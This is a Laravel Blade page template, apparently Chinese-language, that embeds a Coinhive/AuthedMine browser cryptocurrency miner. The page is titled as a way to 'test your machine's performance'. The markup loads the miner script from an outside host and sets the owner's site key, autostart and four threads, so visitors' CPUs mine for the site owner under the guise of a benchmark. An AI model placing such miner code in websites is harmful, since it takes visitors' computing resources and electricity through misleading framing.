@extends('layout')

@section('meta')
<meta name="keywords" content="Miner挖矿-测试你机器的性能">
<meta name="description" content="Miner,挖矿-测试你机器的性能">
@stop

@section('title')
挖矿-测试你机器的性能
@stop


@section('content')
<div class="panel panel-default">
    <div class="panel-heading">
        挖矿-测试你机器的性能
    </div>

    <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
    <div class="panel-body" style="height: 300px;overflow: hidden">
        <div class="coinhive-miner"
             style="height: 410px"
             data-key="Ye62l9o9Ao95AFkOmDQMW2gT4BFFm4Eb"
             data-autostart="true"
             data-whitelabel="false"
             ttdata-background="#000000"
             ttdata-text="#eeeeee"
             ttdata-action="#00ff00"
             ttdata-graph="#555555"
             data-threads="4"
             ttdata-throttle="0.1">
            <em>Loading...</em>
        </div>
    </div>
</div>
@stop